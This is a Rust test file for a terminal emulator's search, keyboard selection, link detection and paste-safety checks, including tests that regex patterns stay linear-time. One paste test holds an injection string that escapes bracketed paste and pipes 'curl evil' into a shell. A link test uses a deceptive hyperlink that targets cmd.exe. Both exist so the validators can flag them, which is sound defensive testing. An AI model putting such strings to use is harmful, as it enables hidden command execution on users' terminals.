//! Search, keyboard selection, links and paste checks of the client view (Step 19, ADR 0048,
//! docs/SUBAK_GUI.md §12, docs/SCROLLBACK.md §4.1). Headless: views fed with VT bytes, nothing
//! drawn, no OS calls. `SUBAK-FR-047`, `SUBAK-SEC-013`, `SUBAK-SEC-014`.

use std::time::{Duration, Instant};
use subak_term::input::{LARGE_PASTE_BYTES, one_line};
use subak_term::links::{self, Kind};
use subak_term::search::{Budget, Query, QueryError, Search, Stop};
use subak_term::{Motion, PasteCheck, Point, SelectMode, Span, TermView};

fn q(text: &str) -> Query {
    Query {
        text: text.into(),
        ..Query::default()
    }
}

fn search(v: &TermView, query: &Query) -> Search {
    Search::new(v, query, Budget::default()).unwrap()
}

/// The text of every match.
fn texts(v: &TermView, s: &Search) -> Vec<String> {
    s.matches().iter().map(|m| v.span_text(*m)).collect()
}

fn p(line: u64, col: u16) -> Point {
    Point { line, col }
}

#[test]
fn korean_and_wide_characters_map_to_their_cells() {
    let mut v = TermView::new(40, 5, 100);
    v.feed("빌드 성공: 한글 테스트\r\nnext 한글\r\n".as_bytes());
    let s = search(&v, &q("한글"));
    // 빌(0-1) 드(2-3) ␠ 성(5-6) 공(7-8) : ␠ 한(11-12) 글(13-14)
    assert_eq!(
        s.matches(),
        [
            Span {
                start: p(0, 11),
                end: p(0, 14)
            },
            Span {
                start: p(1, 5),
                end: p(1, 8)
            }
        ]
    );
    assert_eq!(texts(&v, &s), ["한글", "한글"]);
    // Combining marks stay with their character: e + U+0301 is one cell.
    let mut v = TermView::new(20, 3, 10);
    v.feed("cafe\u{301} ok".as_bytes());
    let s = search(&v, &q("e\u{301} ok"));
    assert_eq!(s.matches()[0].start, p(0, 3));
    assert_eq!(s.matches()[0].end, p(0, 6));
}

#[test]
fn case_whole_word_and_regex_options() {
    let mut v = TermView::new(60, 6, 100);
    v.feed(b"Error 1\r\nERROR 22\r\nerrors: 3\r\nterror\r\n");
    assert_eq!(search(&v, &q("error")).matches().len(), 4);
    let cs = Query {
        case_sensitive: true,
        ..q("ERROR")
    };
    assert_eq!(search(&v, &cs).matches().len(), 1);
    let word = Query {
        whole_word: true,
        ..q("error")
    };
    assert_eq!(texts(&v, &search(&v, &word)), ["Error", "ERROR"]);
    let re = Query {
        regex: true,
        ..q(r"err(or)?s?:?\s+\d+")
    };
    assert_eq!(
        texts(&v, &search(&v, &re)),
        ["Error 1", "ERROR 22", "errors: 3"]
    );
    // A literal search treats regex syntax as text.
    let mut v = TermView::new(30, 3, 10);
    v.feed(b"a.b a+b (x)");
    assert_eq!(texts(&v, &search(&v, &q("a+b"))), ["a+b"]);
    assert_eq!(texts(&v, &search(&v, &q("(x)"))), ["(x)"]);
    // Unicode-aware classes and case folding.
    let mut v = TermView::new(40, 3, 10);
    v.feed("Straße 한글123 ПРИВЕТ".as_bytes());
    let re = Query {
        regex: true,
        ..q(r"\w+\d")
    };
    assert_eq!(texts(&v, &search(&v, &re)), ["한글123"]);
    assert_eq!(texts(&v, &search(&v, &q("привет"))), ["ПРИВЕТ"]);
    assert_eq!(texts(&v, &search(&v, &q("STRAßE"))), ["Straße"]);
}

#[test]
fn regex_limits_refuse_bad_patterns_and_matching_stays_linear() {
    let v = TermView::new(80, 24, 100);
    let re = |t: &str| Query {
        regex: true,
        ..q(t)
    };
    assert_eq!(
        Search::new(&v, &q(""), Budget::default()).unwrap_err(),
        QueryError::Empty
    );
    assert!(matches!(
        Search::new(&v, &re("a(b"), Budget::default()).unwrap_err(),
        QueryError::Invalid(m) if m.contains("unclosed")
    ));
    assert_eq!(
        Search::new(&v, &q(&"x".repeat(1001)), Budget::default()).unwrap_err(),
        QueryError::TooLong { max: 1000 }
    );
    // Over the compiled size cap: refused, never run.
    assert_eq!(
        Search::new(&v, &re("(\\w{100}){100}"), Budget::default()).unwrap_err(),
        QueryError::TooComplex
    );
    // Over the nesting cap.
    let nested = format!("{}a{}", "(".repeat(100), ")".repeat(100));
    assert_eq!(
        Search::new(&v, &re(&nested), Budget::default()).unwrap_err(),
        QueryError::TooComplex
    );
    // Patterns that backtracking engines take exponential time on finish at once: 200 lines
    // of 199 `a` (2 000 rows of history at 20 columns).
    let mut v = TermView::new(200, 10, 2000);
    for _ in 0..200 {
        v.feed(format!("{}\r\n", "a".repeat(199)).as_bytes());
    }
    for pat in ["(a*)*b", "(a|aa)+$", "(a|a?)+b", "^(a+)+c$"] {
        let t = Instant::now();
        let s = Search::new(&v, &re(pat), Budget::default()).unwrap();
        let took = t.elapsed();
        eprintln!(
            "pathological {pat}: {took:?}, {} matches",
            s.matches().len()
        );
        assert!(s.stopped.is_none(), "{pat}");
        assert!(took < Duration::from_secs(2), "{pat}: {took:?}");
    }
}

#[test]
fn a_soft_wrapped_line_is_found_whole_across_rows() {
    let mut v = TermView::new(20, 4, 100);
    let url = "https://example.com/a/very/long/path/x";
    v.feed(format!("see {url} ok\r\nnext\r\nmore\r\nlast").as_bytes());
    // The address wrapped over two rows at 20 columns and left the screen for the history.
    let s = search(&v, &q(url));
    assert_eq!(s.matches().len(), 1);
    let m = s.matches()[0];
    assert_eq!(m.start, p(0, 4));
    assert_eq!(m.end.line, 2, "{m:?}");
    assert_eq!(texts(&v, &s), [url]);
    // The link under any of its cells is the whole address.
    v.scroll_lines(10);
    let row = v.row_of_line(1).unwrap();
    let found = links::link_at(&v, 3, row).unwrap();
    assert_eq!(found.kind, Kind::Text);
    assert_eq!(found.target, url);
    assert_eq!(found.span, Some(m));
}

#[test]
fn history_matches_follow_retention_and_refresh_equals_a_full_search() {
    let mut v = TermView::new(40, 5, 50);
    for i in 0..80 {
        v.feed(format!("line {i} needle\r\n").as_bytes());
    }
    let mut s = search(&v, &q("needle"));
    // 50 history lines and 4 printed screen rows are retained (the cursor's row is empty).
    assert_eq!(s.matches().len(), 54);
    assert_eq!(s.matches()[0].start.line, v.first_line());
    // More output: the oldest lines are evicted, new ones are found.
    for i in 80..95 {
        v.feed(format!("line {i} needle\r\n").as_bytes());
    }
    v.feed(b"tail needle no newline");
    s.refresh(&v);
    let full = search(&v, &q("needle"));
    assert_eq!(s.matches(), full.matches());
    assert_eq!(s.matches().len(), 55);
    assert!(s.matches().iter().all(|m| m.start.line >= v.first_line()));
    // A cleared history drops its matches.
    v.feed(b"\x1b[3J");
    s.refresh(&v);
    assert_eq!(s.matches(), search(&v, &q("needle")).matches());
    assert_eq!(s.matches().len(), 5);
}

#[test]
fn the_alternate_screen_is_searched_alone_while_a_full_screen_program_runs() {
    let mut v = TermView::new(30, 4, 100);
    for i in 0..10 {
        v.feed(format!("shell foo {i}\r\n").as_bytes());
    }
    let mut s = search(&v, &q("foo"));
    assert_eq!(s.matches().len(), 10);
    // A program switches to the alternate screen (vim, less) and shows "foo" twice.
    v.feed(b"\x1b[?1049h\x1b[2J\x1b[Hfoo in vim\r\nbar foo");
    s.refresh(&v);
    assert_eq!(s.matches().len(), 2);
    assert!(s.matches().iter().all(|m| m.start.line >= v.screen_line()));
    // Revealing never scrolls the alternate screen.
    v.reveal(0);
    assert_eq!(v.scroll_offset(), 0);
    v.feed(b"\x1b[?1049l");
    s.refresh(&v);
    assert_eq!(s.matches().len(), 10);
}

#[test]
fn the_budget_keeps_the_newest_matches_and_says_why_it_stopped() {
    let mut v = TermView::new(40, 5, 5000);
    for i in 0..3000 {
        v.feed(format!("hit {i} hit\r\n").as_bytes());
    }
    let few = Budget {
        max_matches: 100,
        ..Budget::default()
    };
    let s = Search::new(&v, &q("hit"), few).unwrap();
    assert_eq!(s.matches().len(), 100);
    assert_eq!(s.stopped, Some(Stop::Matches));
    assert_eq!(v.span_text(*s.matches().last().unwrap()), "hit");
    assert!(
        s.matches()[0].start.line > 2900,
        "the newest matches are kept"
    );
    let instant = Budget {
        time: Duration::ZERO,
        ..Budget::default()
    };
    let s = Search::new(&v, &q("hit"), instant).unwrap();
    assert_eq!(s.stopped, Some(Stop::Time));
    assert!(!s.matches().is_empty() && s.matches().len() < 6000);
}

#[test]
fn starting_points_and_finding_a_match_again() {
    let mut v = TermView::new(30, 5, 100);
    for i in 0..20 {
        v.feed(format!("{}\r\n", if i % 5 == 0 { "mark" } else { "-" }).as_bytes());
    }
    let s = search(&v, &q("mark"));
    let lines: Vec<u64> = s.matches().iter().map(|m| m.start.line).collect();
    assert_eq!(lines, [0, 5, 10, 15]);
    assert_eq!(s.nearest(v.last_line()), Some(3));
    assert_eq!(s.nearest(12), Some(2));
    assert_eq!(s.nearest(0), Some(0));
    assert_eq!(s.find(s.matches()[2]), Some(2));
}

#[test]
fn highlights_mark_cells_by_row_and_reveal_brings_a_match_below_the_first_row() {
    let mut v = TermView::new(20, 5, 100);
    for i in 0..30 {
        v.feed(format!("row {i}\r\n").as_bytes());
    }
    let s = search(&v, &q("row 1"));
    let spans = s.matches().to_vec();
    assert_eq!(spans.len(), 11); // row 1, 10..19
    v.set_highlights(spans.clone(), Some(0));
    // Reveal the first match (line 1, far back in the history).
    v.reveal(spans[0].start.line);
    let r = v.row_of_line(spans[0].start.line).unwrap();
    assert!(r >= 1, "below the row the search bar covers: {r}");
    let mut cols = Vec::new();
    v.highlight_cols(r, &mut cols);
    assert_eq!(cols, [(0, 4, true)]);
    v.highlight_cols(r + 1, &mut cols);
    assert!(cols.is_empty(), "line 2 has no match");
    // A match over two rows is marked on both.
    let mut v = TermView::new(10, 4, 10);
    v.feed(b"0123456789abc");
    v.set_highlights(
        vec![Span {
            start: p(0, 8),
            end: p(1, 1),
        }],
        None,
    );
    v.highlight_cols(0, &mut cols);
    assert_eq!(cols, [(8, 9, false)]);
    v.highlight_cols(1, &mut cols);
    assert_eq!(cols, [(0, 1, false)]);
}

#[test]
fn keyboard_selection_moves_by_cells_words_lines_and_pages() {
    let mut v = TermView::new(30, 4, 100);
    v.feed("first line\r\n한글 word end\r\n$ ".as_bytes());
    v.mark_begin();
    assert!(v.marking());
    // The caret starts at the cursor (row 2, column 2).
    assert_eq!(v.selected_text().as_deref(), Some(""));
    v.mark_move(Motion::Up, false);
    v.mark_move(Motion::LineStart, false);
    // Shift+Right over a wide character takes both its cells at once.
    v.mark_move(Motion::Right, true);
    assert_eq!(v.selected_text().as_deref(), Some("한"));
    v.mark_move(Motion::Right, true);
    assert_eq!(v.selected_text().as_deref(), Some("한글"));
    v.mark_move(Motion::WordRight, true);
    assert_eq!(v.selected_text().as_deref(), Some("한글 word"));
    v.mark_move(Motion::LineEnd, true);
    assert_eq!(v.selected_text().as_deref(), Some("한글 word end"));
    // Without Shift the caret moves alone.
    v.mark_move(Motion::Up, false);
    v.mark_move(Motion::LineStart, false);
    v.mark_move(Motion::WordRight, true);
    assert_eq!(v.selected_text().as_deref(), Some("first"));
    v.mark_move(Motion::WordRight, true);
    assert_eq!(v.selected_text().as_deref(), Some("first line"));
    // The caret alone moves to the next word's start.
    v.mark_move(Motion::LineStart, false);
    v.mark_move(Motion::WordRight, false);
    v.mark_move(Motion::Right, true);
    assert_eq!(v.selected_text().as_deref(), Some("li"));
    v.mark_move(Motion::Down, true);
    assert_eq!(v.selected_text().as_deref(), Some("line\n한글 wor"));
    v.mark_end(true);
    assert!(!v.marking());
    assert!(v.has_selection());
    // Paging scrolls a long history to keep the caret in view.
    let mut v = TermView::new(20, 5, 100);
    for i in 0..40 {
        v.feed(format!("l{i}\r\n").as_bytes());
    }
    v.mark_begin();
    v.mark_move(Motion::PageUp, false);
    v.mark_move(Motion::PageUp, false);
    assert!(v.scroll_offset() > 0);
    v.mark_move(Motion::Top, false);
    assert_eq!(v.scroll_offset(), v.screen().history_len());
    v.mark_move(Motion::Bottom, true);
    assert_eq!(v.scroll_offset(), 0);
    // Typing ends mark mode.
    let _ = v.key(subak_term::Key::Char('x'), subak_term::Mods::NONE);
    assert!(!v.marking() && !v.has_selection());
}

#[test]
fn select_all_takes_the_history_and_the_screen() {
    let mut v = TermView::new(20, 3, 100);
    v.feed("one\r\n둘\r\nthree\r\nfour".as_bytes());
    v.select_all();
    assert_eq!(v.selected_text().as_deref(), Some("one\n둘\nthree\nfour"));
    let cells = v.selected_cells().unwrap();
    assert_eq!(cells.len(), 4);
    assert_eq!(cells[1].len(), 1, "a wide character once");
    // A word selection still expands as before.
    v.select(0, 0, SelectMode::Word);
    assert!(v.has_selection());
}

#[test]
fn hyperlinks_and_detected_addresses_under_the_pointer() {
    let mut v = TermView::new(60, 3, 10);
    v.feed(
        b"\x1b]8;;https://example.com/osc\x1b\\click here\x1b]8;;\x1b\\ or http://plain.example/x.",
    );
    let h = links::link_at(&v, 2, 0).unwrap();
    assert_eq!(h.kind, Kind::Hyperlink);
    assert_eq!(h.target, "https://example.com/osc");
    let t = links::link_at(&v, 20, 0).unwrap();
    assert_eq!(t.kind, Kind::Text);
    assert_eq!(t.target, "http://plain.example/x");
    assert_eq!(
        t.span,
        Some(Span {
            start: p(0, 14),
            end: p(0, 35)
        })
    );
    assert!(links::link_at(&v, 11, 0).is_none(), "between the two");
    assert_eq!(
        links::validate(&h.target).as_deref(),
        Ok("https://example.com/osc")
    );
    // A hyperlink whose text looks like one address but targets another: the target counts.
    let mut v = TermView::new(60, 3, 10);
    v.feed(b"\x1b]8;;file:///C:/Windows/System32/cmd.exe\x1b\\https://safe.example\x1b]8;;\x1b\\");
    let h = links::link_at(&v, 3, 0).unwrap();
    assert_eq!(h.kind, Kind::Hyperlink);
    assert!(links::validate(&h.target).is_err());
}

#[test]
fn paste_checks_flag_lines_that_run_control_sequences_and_size() {
    let one = PasteCheck::of("echo hello", false);
    assert!(!one.needs_confirmation());
    let lines = PasteCheck::of("cd x\r\nrm -rf build\nls\n", false);
    assert_eq!(lines.breaks, 3);
    assert!(lines.ends_with_break && lines.runs_lines() && lines.needs_confirmation());
    // Under bracketed paste the program receives the lines as one paste.
    let bracketed = PasteCheck::of("a\nb", true);
    assert!(!bracketed.runs_lines() && !bracketed.needs_confirmation());
    // Hidden escape sequences are always worth a question, bracketed or not.
    let sneaky = PasteCheck::of("echo hi\x1b[201~\x1b]0;x\x07; curl evil | sh", true);
    assert_eq!(sneaky.escapes, 2);
    assert_eq!(sneaky.controls, 3);
    assert!(sneaky.needs_confirmation());
    let c1 = PasteCheck::of("a\u{9b}31mb", false);
    assert_eq!((c1.controls, c1.escapes), (1, 1));
    let big = PasteCheck::of(&"x".repeat(LARGE_PASTE_BYTES + 1), true);
    assert!(big.needs_confirmation());
    assert_eq!(
        one_line("  cd build \r\n\r\n  make all\n\tcheck  \n"),
        "cd build make all check"
    );
    assert_eq!(one_line("한글\n테스트"), "한글 테스트");
}

/// Huge output: the largest history a pane keeps, searched in full (numbers in
/// docs/SUBAK_GUI.md §12.7; a release build is ~10 × faster than this debug test).
#[test]
fn huge_history_search_numbers() {
    let mut v = TermView::new(120, 30, 100_000);
    let t = Instant::now();
    let mut bytes = 0usize;
    for i in 0..60_000u32 {
        let line = format!(
            "\x1b[32m[{i:06}]\x1b[0m compiling crate_{} v0.{}.{} (C:\\src\\project\\crate_{}) 한글 {}\r\n",
            i % 97,
            i % 13,
            i % 7,
            i % 97,
            if i % 1000 == 0 { "NEEDLE" } else { "ok" }
        );
        bytes += line.len();
        v.feed(line.as_bytes());
    }
    let fed = t.elapsed();
    let kept = v.screen().history();
    let unlimited = Budget {
        max_matches: 1_000_000,
        time: Duration::from_secs(120),
    };
    let t = Instant::now();
    let s = Search::new(&v, &q("needle"), unlimited).unwrap();
    let literal = t.elapsed();
    let re = Query {
        regex: true,
        ..q(r"crate_(\d+) v0\.1\d")
    };
    let t = Instant::now();
    let r = Search::new(&v, &re, unlimited).unwrap();
    let regex = t.elapsed();
    let t = Instant::now();
    let d = Search::new(&v, &q("한글"), Budget::default()).unwrap();
    let budgeted = t.elapsed();
    eprintln!(
        "huge: fed {bytes} bytes in {fed:?}; history {} lines / {} bytes (limit {} / {}); \
         literal: {} matches in {literal:?} ({} lines); regex: {} matches in {regex:?}; \
         default budget: {} matches in {budgeted:?}, stopped {:?}",
        kept.lines,
        kept.bytes,
        kept.limit_lines,
        kept.limit_bytes,
        s.matches().len(),
        s.lines_searched,
        r.matches().len(),
        d.matches().len(),
        d.stopped
    );
    assert!(s.stopped.is_none());
    // Every retained NEEDLE line is found.
    let retained = (v.first_line()..=v.last_line())
        .filter(|&l| {
            let mut t = String::new();
            v.line_text(l, &mut t);
            t.contains("NEEDLE")
        })
        .count();
    assert_eq!(s.matches().len(), retained);
    assert!(d.matches().len() <= 10_000);
    // The default budget bounds a search's time (one check every 32 lines past it).
    assert!(budgeted < Duration::from_secs(2), "{budgeted:?}");
}
